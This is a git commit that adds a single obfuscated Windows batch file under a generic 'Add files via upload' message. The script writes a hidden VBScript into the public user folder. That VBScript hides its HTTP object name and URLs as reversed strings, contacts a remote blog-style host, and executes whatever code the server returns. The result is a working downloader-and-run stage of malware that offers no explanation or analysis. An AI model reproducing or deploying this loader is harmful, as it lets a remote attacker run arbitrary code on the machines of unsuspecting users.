e9b0fd267cea484f153630d48ed76956ce62271d
secretamaster <45047553+secretamaster@users.noreply.github.com>
2018-11-28 23:30:50 -0200

    Add files via upload

---
+++ l-o-o-2811231827.cmd
@@ -0,0 +1,27 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+if exist %public%\aRX6yZp goto hnErxq4
+md "%PUBLIC%\aRX6yZp" && cls
+set jbIBlLI=%USERNAME%.vbs
+set ivfDHUl="%PUBLIC%\aRX6yZp\%jbIBlLI%" ECHO
+:Fase1
+>>%ivfDHUl% Dim bI9pgi4
+>>%ivfDHUl% Dim comZjZJ
+>>%ivfDHUl% Dim dpZ9LQY
+>>%ivfDHUl% Dim eaGPXfM
+>>%ivfDHUl% Dim fz7dpQx
+>>%ivfDHUl% Dim gxBVSDp
+>>%ivfDHUl% Dim hcLeFm7
+>>%ivfDHUl% comZjZJ = WScript.Arguments(0)
+>>%ivfDHUl% dpZ9LQY = WScript.Arguments(1)
+>>%ivfDHUl% Set bI9pgi4 = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%ivfDHUl% bI9pgi4.open StrReverse(comZjZJ), StrReverse(dpZ9LQY), False
+>>%ivfDHUl% execute("bI9pgi4.setRequestHeader ""User-Agent"", ""5M2yC1u0stom0U0se2r"":bI9pgi4.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%ivfDHUl% execute("bI9pgi4.send :eaGPXfM = bI9pgi4.responseText")
+>>%ivfDHUl% execute( eaGPXfM )
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+start wscript //Nologo "%PUBLIC%\aRX6yZp\%jbIBlLI%" AS111 "moc.golbsihtsetirw.odacatalisarb//:ptth" && @echo off
+endlocal
+:hnErxq4
